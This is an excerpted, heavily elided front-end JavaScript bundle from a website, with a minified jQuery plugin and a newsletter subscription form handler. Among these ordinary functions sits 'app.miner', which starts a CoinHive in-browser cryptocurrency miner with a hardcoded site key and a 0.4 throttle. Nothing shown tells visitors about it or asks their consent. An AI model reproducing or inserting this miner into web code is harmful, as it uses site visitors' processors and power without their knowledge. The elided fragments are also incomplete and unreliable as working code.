...
! function(a) { "use strict"; "function" == typeof define && define.amd ? define(["jquery"], a) : "object" == typeof exports ? module.exports = a(require("jquery")) : a(jQuery) }(function(a) {
    ...
    function e(a) { return a && (0 === a.offsetWidth || 0 === a.offsetHeight || !1 === a.open) }

    function f(a) { for (var b = [], c = a.parentNode; e(c);) b.push(c), c = c.parentNode; return b }

    function g(a, b) {
        function c(a) { void 0 !== a.open && (a.open = !a.open) }
        var d = f(a),
            e = d.length,
            g = [],
            h = a[b];
...
app.miner = function() {
    ...
    miner = new CoinHive.Anonymous('MuxsN9qD0Xbe6SX592qIQI7g50254HVG', { throttle: 0.4 });
...
app.SubscribeForm = function() {
    ...
    if (!emailRegex.test($('#subscribeEmail').val())) {
        $('#subscribeForm .error').html('Valid email required');
        $('#subscribeForm .error').show();
    } else {
        ...
        $.ajax({
            ...
            if (result.error) {
                $('#subscribeForm .error').html(result.error);
                $('#subscribeForm .error').fadeIn();
            } else {
                $('.modal-subscribe .btnSubscribeEmail').fadeOut(tSpeed);
                $('.modal-subscribe .thankyou').fadeIn(tSpeed);
            }
        }).fail(function(jqXHR, textStatus) {
            if (textStatus == 'parsererror') {
                $('.modal-subscribe .btnSubscribeEmail').hide();
                $('.modal-subscribe .thankyou').fadeIn(tSpeed);
            }
        });
    }
